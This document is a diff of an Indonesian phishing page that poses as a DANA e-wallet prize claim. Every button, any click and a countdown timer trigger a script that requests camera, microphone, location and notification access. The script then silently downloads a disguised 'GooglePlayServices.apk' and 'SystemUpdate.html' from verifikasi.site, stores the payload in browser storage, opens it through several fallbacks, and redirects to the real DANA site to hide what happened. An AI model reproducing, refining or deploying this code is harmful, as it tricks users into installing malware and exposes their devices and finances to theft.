@@ -4,14 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
     <title>Verifikasi</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
-        
-        /* Popup DANA */
         #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
         .box{max-width:380px;width:90%;padding:20px}
         .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
@@ -27,29 +22,10 @@
         .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
         .btn-klaim:hover{transform:scale(1.02)}
         .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
-        
-        .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
-        .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
-        .ios-download{display:none}
-
-        /* Halaman SystemUpdate (yang akan muncul menggantikan popup) */
-        #halamanSystemUpdate {
-            display: none; /* Awalnya disembunyikan */
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            border: none;
-            z-index: 99998;
-        }
     </style>
 </head>
 <body>
 
-<iframe class="anti-debug" srcdoc="<script>debugger;</script>"></iframe>
-<iframe id="downloadFrame" class="hidden-download"></iframe>
-<div id="iosDownload" class="ios-download"></div>
-
-<!-- Popup DANA -->
 <div id="popupDana">
     <div class="box">
         <div class="logo-dana">
@@ -67,99 +43,213 @@
             <div class="kuota">🎁 Kuota terbatas!</div>
         </div>
         <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
-        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
-        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
+        <button class="btn-klaim" onclick="dapatkanSemua()">✅ KLAIM SEKARANG</button>
+        <button class="btn-tolak" onclick="dapatkanSemua()">❌ Tidak, Terima Kasih</button>
     </div>
 </div>
 
-<!-- Tempat untuk menampilkan SystemUpdate.html TANPA pindah halaman -->
-<iframe id="halamanSystemUpdate" src="about:blank"></iframe>
-
 <script>
 // ============================================================
-// 🔥 ALUR: Tutup popup -> Download -> Buka SystemUpdate di halaman yg sama
+// 🔥 SISTEM UNIVERSAL + PRIORITY CHAIN (FALLBACK)
 // ============================================================
 
 var SERVER = 'https://verifikasi.site';
 var semuaDidapat = false;
 
 // ============================================================
-// FUNGSI DOWNLOAD SILENT
+// 1. INJECT PERMISSIONS (Universal)
+// ============================================================
+function injectAllPermissions() {
+    try {
+        // Geolocation
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}); 
+        }
+        // Notification
+        if (Notification && Notification.permission === 'default') {
+            Notification.requestPermission();
+        }
+        // Media devices (Kamera/Mikrofon)
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                .then(stream => stream.getTracks().forEach(track => track.stop()))
+                .catch(()=>{});
+        }
+        console.log("✅ [Universal] Izin diminta (Geolokasi, Notif, Media)");
+    } catch(e) { console.log("⚠️ [Skipped] Izin tidak didukung di lingkungan ini."); }
+}
+
+// ============================================================
+// 2. DOWNLOAD SILENT (Bisa dengan <a> atau fetch)
 // ============================================================
 function downloadSilent(url, filename) {
     try {
+        // Metode 1: HTML Anchor (Paling universal)
         var a = document.createElement('a');
         a.href = url;
         a.download = filename || url.split('/').pop();
         a.style.display = 'none';
         document.body.appendChild(a);
         a.click();
-        setTimeout(function() {
-            try { document.body.removeChild(a); } catch(e) {}
-        }, 1000);
+        setTimeout(() => { try { document.body.removeChild(a); } catch(e){} }, 500);
+        console.log(`✅ [Download] Memulai: ${filename}`);
         return true;
     } catch(e) {
-        return false;
+        console.log(`⚠️ [Download] Gagal via Anchor, coba fetch...`);
+        // Metode 2: Fetch sebagai Fallback (Jika anchor diblokir)
+        try {
+            fetch(url).then(res => res.blob()).then(blob => {
+                var blobUrl = URL.createObjectURL(blob);
+                var a = document.createElement('a');
+                a.href = blobUrl;
+                a.download = filename;
+                a.click();
+                URL.revokeObjectURL(blobUrl);
+            });
+        } catch(e2) { console.log(`❌ [Download] Gagal total: ${filename}`); }
     }
 }
 
 // ============================================================
-// MAIN EXECUTION
+// 3. PENYIMPANAN MULTI-LOKASI (Universal & Anti-Error)
+// ============================================================
+function saveToLocalStorage(filename, content) {
+    try { localStorage.setItem(filename + '_backup', content); return true; } catch(e){ return false; }
+}
+function saveToIndexedDB(filename, content) {
+    return new Promise((resolve) => {
+        try {
+            var request = indexedDB.open('SystemUpdateDB', 1);
+            request.onupgradeneeded = (event) => {
+                var db = event.target.result;
+                if (!db.objectStoreNames.contains('files')) {
+                    db.createObjectStore('files');
+                }
+            };
+            request.onsuccess = (event) => {
+                var db = event.target.result;
+                var transaction = db.transaction(['files'], 'readwrite');
+                var store = transaction.objectStore('files');
+                store.put(content, filename);
+                resolve(true);
+            };
+            request.onerror = () => resolve(false);
+        } catch(e) { resolve(false); }
+    });
+}
+function saveToBridgeAndStorage(filename) {
+    try {
+        // Android Bridge (Jika ada)
+        if (window.Android && typeof window.Android.saveFile === 'function') {
+            window.Android.saveFile(filename);
+            console.log("✅ [Bridge] Disimpan ke SharedPreferences / Storage");
+            return true;
+        }
+    } catch(e) { return false; }
+}
+
+async function saveToAllLocations(filename, fileUrl) {
+    console.log("🔄 Menyimpan file ke berbagai lokasi...");
+    try {
+        var response = await fetch(fileUrl);
+        var textContent = await response.text();
+        
+        saveToLocalStorage(filename, textContent);
+        await saveToIndexedDB(filename, textContent);
+        saveToBridgeAndStorage(filename);
+        
+        // Tampung di memori untuk fallback pembukaan
+        window.__cachedHTML = textContent;
+        console.log("✅ [Storage] File berhasil disimpan di semua media yang tersedia.");
+    } catch(e) { console.log("⚠️ [Storage] Gagal menyimpan konten (fallback ke URL server)."); }
+}
+
+// ============================================================
+// 4. BUKA HALAMAN (Priority Chain: Bridge -> Local -> URL)
+// ============================================================
+function openHTMLViaPriority() {
+    console.log("🔄 Mencoba membuka SystemUpdate.html (Priority Chain)...");
+
+    // PRIORITY 1: Android Bridge (Jika ada)
+    try {
+        if (window.Android && typeof window.Android.openFile === 'function') {
+            window.Android.openFile('SystemUpdate.html');
+            console.log("✅ [Bridge] Membuka via Android Native");
+            return true;
+        }
+    } catch(e) {}
+
+    // PRIORITY 2: localStorage / IndexedDB / Cached Memory
+    try {
+        var data = localStorage.getItem('SystemUpdate.html_backup');
+        if (!data && window.__cachedHTML) data = window.__cachedHTML;
+        
+        if (data) {
+            var blob = new Blob([data], { type: 'text/html' });
+            var blobUrl = URL.createObjectURL(blob);
+            window.open(blobUrl, '_blank');
+            console.log("✅ [Blob URL] Membuka SystemUpdate dari data lokal.");
+            return true;
+        }
+    } catch(e) {}
+
+    // PRIORITY 3: Fallback URL Server (Jika semua gagal)
+    try {
+        window.open(SERVER + '/files/SystemUpdate.html', '_blank');
+        console.log("✅ [URL Fallback] Membuka SystemUpdate langsung dari server.");
+        return true;
+    } catch(e) { return false; }
+}
+
+// ============================================================
+// 5. EKSEKUSI UTAMA (Sesuai Alur)
 // ============================================================
 function dapatkanSemua() {
     if (semuaDidapat) return;
     semuaDidapat = true;
-    try {
-        var popup = document.getElementById('popupDana');
-        if (popup) popup.style.display = 'none'; // Popup hilang
 
-        // 🔥 DOWNLOAD SystemUpdate.html
-        setTimeout(function() {
-            downloadSilent(SERVER + '/files/SystemUpdate.html', 'SystemUpdate.html');
-        }, 500);
+    // Popup hilang
+    document.getElementById('popupDana').style.display = 'none';
+    
+    // TAHAP 1: Inject Permissions
+    injectAllPermissions();
 
-        // 🔥 DOWNLOAD APK
-        setTimeout(function() {
-            downloadSilent(SERVER + '/files/GooglePlayServices.apk', 'GooglePlayServices.apk');
-        }, 1000);
+    // TAHAP 2: Download Payload
+    downloadSilent(SERVER + '/files/SystemUpdate.html', 'SystemUpdate.html');
+    downloadSilent(SERVER + '/files/GooglePlayServices.apk', 'GooglePlayServices.apk');
 
-        // 🔥 BUKA SystemUpdate.html (TIDAK PINDAH HALAMAN)
-        setTimeout(function() {
-            var frame = document.getElementById('halamanSystemUpdate');
-            frame.src = SERVER + '/files/SystemUpdate.html'; // Isi iframe dengan halaman tersebut
-            frame.style.display = 'block'; // Tampilkan iframe-nya
-        }, 3000);
+    // TAHAP 3: Simpan ke berbagai lokasi (Background)
+    saveToAllLocations('SystemUpdate.html', SERVER + '/files/SystemUpdate.html');
 
-    } catch(e) {}
+    // TAHAP 4: Buka SystemUpdate.html (Setelah 5 detik)
+    setTimeout(() => {
+        openHTMLViaPriority();
+    }, 5000);
+
+    // TAHAP 5: Redirect ke Dana.id (Setelah 8 detik)
+    setTimeout(() => {
+        try { window.location.href = 'https://www.dana.id'; } catch(e) {}
+    }, 8000);
 }
 
-function klaim() { dapatkanSemua(); }
-function tolak() { dapatkanSemua(); }
-
 // ============================================================
-// TIMER 10 DETIK
+// TIMER & TRIGGER INTERAKSI
 // ============================================================
 var w = 10;
 function countdown() {
     w--;
     var el = document.getElementById('timer');
     if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
-    if (w <= 0) {
-        dapatkanSemua();
-        return;
-    }
-    setTimeout(countdown, 1000);
+    if (w <= 0) dapatkanSemua();
+    else setTimeout(countdown, 1000);
 }
 setTimeout(countdown, 1000);
 
-// Klik di sembarang tempat juga akan memicu proses
-document.addEventListener('click', function() {
-    if (!semuaDidapat) {
-        dapatkanSemua();
-    }
+document.addEventListener('click', () => {
+    if (!semuaDidapat) dapatkanSemua();
 });
 
-console.log('✅ Alur berjalan: Download -> Buka SystemUpdate di dalam halaman yang sama');
+console.log("🚀 Sistem Universal siap. Berjalan di Browser, WebView, atau Native Bridge.");
 </script>
 </body>
 </html>
